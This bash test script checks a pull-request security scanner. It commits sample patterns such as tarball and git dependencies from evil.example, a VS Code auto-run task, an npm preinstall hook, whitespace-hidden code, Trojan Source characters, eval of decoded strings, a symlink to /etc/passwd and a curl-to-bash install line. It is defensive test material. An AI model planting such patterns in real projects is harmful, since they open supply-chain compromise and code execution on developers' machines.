#!/usr/bin/env bash
# Regression tests for scan-pr.sh. Builds a throwaway repository with one
# branch per pattern and asserts the scanner's exit code for each.
# Usage: bash scripts/flowguard/test-scan.sh
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
WORK="$(mktemp -d)"
OUT="$(mktemp)"
trap 'rm -rf "$WORK" "$OUT"' EXIT

cd "$WORK"
git init -q -b main
git config user.email test@example.com
git config user.name test
mkdir -p scripts/flowguard crates/demo/src
cp "$ROOT/scripts/check-repo-hygiene.sh" scripts/
cp "$ROOT/scripts/flowguard/scan-pr.sh" scripts/flowguard/
printf '[package]\nname = "demo"\n' >crates/demo/Cargo.toml
printf 'pub fn demo() {}\n' >crates/demo/src/lib.rs
printf '{"name":"demo","scripts":{"test":"node --test"}}\n' >package.json
git add -A
git commit -qm base

pass=0
failures=0

# case NAME EXPECTED_EXIT — run the commands on stdin on a fresh branch.
case_() {
  local name=$1 expected=$2 actual=0
  git checkout -q -b "case-$pass-$failures" main
  bash -e
  git add -A
  git commit -qm "$name" --allow-empty
  bash scripts/flowguard/scan-pr.sh main HEAD >"$OUT" 2>&1 || actual=$?
  git checkout -q main
  if [[ "$actual" == "$expected" ]]; then
    pass=$((pass + 1))
  else
    failures=$((failures + 1))
    echo "FAIL: $name (expected exit $expected, got $actual)"
    sed 's/^/    /' "$OUT"
  fi
}

case_ "clean code change" 0 <<'EOF'
printf 'pub fn demo() -> u32 { 1 }\n' >crates/demo/src/lib.rs
EOF
case_ "build.rs module that is not a build script" 0 <<'EOF'
mkdir -p crates/demo/src/commands && printf 'pub fn build() {}\n' >crates/demo/src/commands/build.rs
EOF
case_ "local file: dependency" 0 <<'EOF'
printf '{"name":"demo","dependencies":{"sdk":"file:../sdk"}}\n' >package.json
EOF
case_ "pnpm workspace dependency" 0 <<'EOF'
printf '{"name":"demo","dependencies":{"@demo/shared":"workspace:*"}}\n' >package.json
EOF
case_ "pnpm registry lock entry" 0 <<'EOF'
printf 'packages:\n\n  zod@3.25.76:\n    resolution: {integrity: sha512-abc}\n' >pnpm-lock.yaml
EOF
case_ "pnpm tarball lock entry" 2 <<'EOF'
printf 'packages:\n\n  x@1.0.0:\n    resolution: {tarball: https://evil.example/x.tgz}\n' >pnpm-lock.yaml
EOF
case_ "pnpm git lock entry" 2 <<'EOF'
printf 'packages:\n\n  x@git+https://evil.example/x.git#abc:\n    resolution: {commit: abc, repo: https://evil.example/x.git, type: git}\n' >pnpm-lock.yaml
EOF

case_ "padded markdown table" 0 <<'EOF'
printf '| a%200s| b |\n' '' >README.md
EOF
case_ "embedded Soroban contract spec" 0 <<'EOF'
printf 'new ContractSpec([ "AAAA%s",\n  "AAAA%s",\n]);\n' "$(head -c 900 /dev/zero | tr '\0' 'B')" "$(head -c 2100 /dev/zero | tr '\0' 'C')" >client.ts
EOF

case_ "vscode auto-run task" 2 <<'EOF'
mkdir -p .vscode && printf '{"tasks":[{"runOn":"folderOpen"}]}\n' >.vscode/tasks.json
EOF
case_ "font file payload" 2 <<'EOF'
mkdir -p public/fonts && printf 'x' >public/fonts/fa-solid-500.woff2
EOF
case_ "npm preinstall hook" 2 <<'EOF'
printf '{"name":"demo","scripts":{"preinstall":"node x.js"}}\n' >package.json
EOF
case_ "code hidden after whitespace" 2 <<'EOF'
printf 'const a = 1;%200s%s\n' '' 'require("child_process")' >index.js
EOF
case_ "Trojan Source bidi character" 2 <<'EOF'
printf 'let ok = true; // \xe2\x80\xae } \xe2\x81\xa6\n' >crates/demo/src/lib.rs
EOF
case_ "eval of decoded string" 2 <<'EOF'
printf 'eval(atob("YWxlcnQoMSk="));\n' >index.js
EOF
case_ "lockfile resolved from foreign host" 2 <<'EOF'
printf '{"packages":{"node_modules/x":{"resolved": "https://evil.example/x.tgz"}}}\n' >package-lock.json
EOF
case_ "npm git dependency" 2 <<'EOF'
printf '{"name":"demo","dependencies":{"x":"github:evil/x"}}\n' >package.json
EOF
case_ "cargo git dependency" 2 <<'EOF'
printf '[package]\nname = "demo"\n[dependencies]\nx = { git = "https://evil.example/x" }\n' >crates/demo/Cargo.toml
EOF
case_ "symlink" 2 <<'EOF'
ln -s /etc/passwd link
EOF
case_ "binary blob" 2 <<'EOF'
printf '\x00\x01\x02\x7fELF' >payload.bin
EOF

case_ "cargo build script" 1 <<'EOF'
printf 'fn main() {}\n' >crates/demo/build.rs
EOF
case_ "workflow change" 1 <<'EOF'
mkdir -p .github/workflows && printf 'on: pull_request_target\n' >.github/workflows/x.yml
EOF
case_ "child_process in TypeScript" 1 <<'EOF'
printf 'import { spawnSync } from "node:child_process";\n' >tool.ts
EOF
case_ "large base64 blob" 1 <<'EOF'
printf 'const blob = "%s";\n' "$(head -c 600 /dev/zero | tr '\0' 'Q')" >data.js
EOF
case_ "cargo build dependency" 1 <<'EOF'
printf '[package]\nname = "demo"\n[build-dependencies]\ncc = "1"\n' >crates/demo/Cargo.toml
EOF
case_ "very long line of code" 1 <<'EOF'
printf 'const x = [%s];\n' "$(seq -s, 1 600)" >data.ts
EOF
case_ "curl piped to shell" 1 <<'EOF'
printf 'curl -fsSL https://example.com/install | bash\n' >install.md
EOF

echo "scan-pr tests: ${pass} passed, ${failures} failed"
((failures == 0))
